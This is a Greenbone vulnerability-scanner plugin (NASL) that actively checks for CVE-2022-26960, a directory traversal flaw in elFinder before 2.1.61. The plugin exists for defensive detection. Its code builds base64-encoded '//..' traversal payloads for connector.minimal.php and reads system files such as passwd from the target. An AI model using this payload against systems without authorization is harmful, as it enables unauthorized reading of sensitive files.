# Copyright (C) 2022 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:studio42:elfinder";

if( description )
{
  script_oid("1.3.6.1.4.1.25623.1.0.148379");
  script_version("2022-07-05T09:34:53+0000");
  script_tag(name:"last_modification", value:"2022-07-05 09:34:53 +0000 (Tue, 05 Jul 2022)");
  script_tag(name:"creation_date", value:"2022-07-05 06:43:33 +0000 (Tue, 05 Jul 2022)");
  script_tag(name:"cvss_base", value:"5.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2022-06-30 19:47:00 +0000 (Thu, 30 Jun 2022)");

  script_cve_id("CVE-2022-26960");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("elFinder < 2.1.61 Directory Traversal Vulnerability - Active Check");

  script_category(ACT_GATHER_INFO);

  script_copyright("Copyright (C) 2022 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_elfinder_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("studio42/elfinder/http/detected", "Host/runs_unixoide");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"elFinder is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Checks if a vulnerable version is present on the target host.");

  script_tag(name:"insight", value:"connector.minimal.php is affected by a path traversal due to
  improper handling of absolute file paths.");

  script_tag(name:"impact", value:"Unauthenticated remote attackers may read, write and browse
  files outside the configured document root.");

  script_tag(name:"affected", value:"elFinder version 2.1.60 and prior.");

  script_tag(name:"solution", value:"Update to version 2.1.61 or later.");

  script_xref(name:"URL", value:"https://github.com/Studio-42/elFinder/releases/tag/2.1.61");
  script_xref(name:"URL", value:"https://www.synacktiv.com/publications/elfinder-the-story-of-a-repwning.html");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/php/connector.minimal.php?cmd=open&target=l1_Lw&init=1&tree=1";

req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

# "url":"\/php\/..\/files\/"
path = eregmatch(pattern: '"url":"([^"]+)', string: res);
if (isnull(path[1]))
  exit(0);

output_dir = ereg_replace(pattern: "\\", string: path[1], replace: "");
output_dir = ereg_replace(pattern: "/$", string: output_dir, replace: "");

files = traversal_files("linux");

install_path = "/var/www/html" + output_dir;

foreach pattern (keys(files)) {
  payload = install_path + crap(data: "//..", length: 6 * 4) + "/" + files[pattern];
  payload_b64 = base64(str: payload);

  url = dir + "/php/connector.minimal.php?cmd=file&target=l1_" + payload_b64 + "&download=1";

  req = http_get(port: port, item: url);
  res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

  if (egrep(pattern: pattern, string: res)) {
    info['HTTP Method'] = "GET";
    info['Affected URL'] = http_report_vuln_url(port: port, url: url, url_only: TRUE);

    report  = 'By doing the following HTTP request:\n\n';
    report += text_format_table(array: info) + '\n\n';
    report += 'it was possible to obtain the file "/' + files[pattern] + '" from the target host.';
    report += '\n\nResult:\n\n' + res;
    expert_info = 'Request:\n\n' + req + '\n\nResponse:\n\n' + res;
    security_message(port: port, data: report, expert_info: expert_info);
    exit(0);
  }
}

exit(0); # nb: The check depends on the installation path
